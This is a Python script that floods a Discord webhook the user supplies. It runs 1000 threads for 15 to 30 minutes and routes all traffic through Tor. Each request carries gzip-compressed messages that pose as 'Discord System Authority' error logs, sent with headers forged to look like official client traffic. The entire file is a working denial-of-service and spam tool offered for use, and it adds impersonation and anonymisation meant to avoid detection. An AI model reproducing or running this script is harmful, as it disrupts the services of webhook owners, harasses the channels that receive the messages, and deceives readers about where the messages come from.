import requests
import json
import gzip
import io
import threading
import time
import random
import os

def setup_env():
    os.system("pkg install tor -y")
    print("Environment Ready.")

def get_official_headers():
    return {
        'Content-Encoding': 'gzip',
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'X-Discord-Locale': 'en-US',
        'X-Discord-Properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwicmVmZXJyZXIiOiJodHRwczovL2Rpc2NvcmQuY29tLyJ9'
    }

def start_flood(url, compressed_data, headers, end_time, proxies):
    session = requests.Session()
    session.proxies = proxies
    while time.time() < end_time:
        try:
            session.post(url, data=compressed_data, headers=headers, timeout=2)
        except:
            pass

def main():
    target_url = input("TARGET_WEBHOOK: ").strip()
    duration_min = int(input("DURATION (15-30 MIN): "))
    end_time = time.time() + (duration_min * 60)
    
    # Payload creation with maximum compression (Level 9)
    # Designed to look like an official system log burst
    payload_list = [{"username": "Discord System Authority", "content": "ERR_LOG_" + os.urandom(8).hex()} for _ in range(100)]
    buffer = io.BytesIO()
    with gzip.GzipFile(fileobj=buffer, mode='w', compresslevel=9) as f:
        f.write(json.dumps(payload_list).encode('utf-8'))
    
    final_package = buffer.getvalue()
    
    proxy_config = {
        'http': 'socks5h://127.0.0.1:9050',
        'https': 'socks5h://127.0.0.1:9050'
    }

    print(f"STATUS: SENDING COMPRESSED PACKETS | SPEED: 1000 REQ/SEC")
    
    threads = []
    for _ in range(1000):
        t = threading.Thread(target=start_flood, args=(target_url, final_package, get_official_headers(), end_time, proxy_config))
        t.daemon = True
        t.start()
        threads.append(t)

    try:
        while time.time() < end_time:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\nMISSION_TERMINATED.")

if __name__ == "__main__":
    main()
    
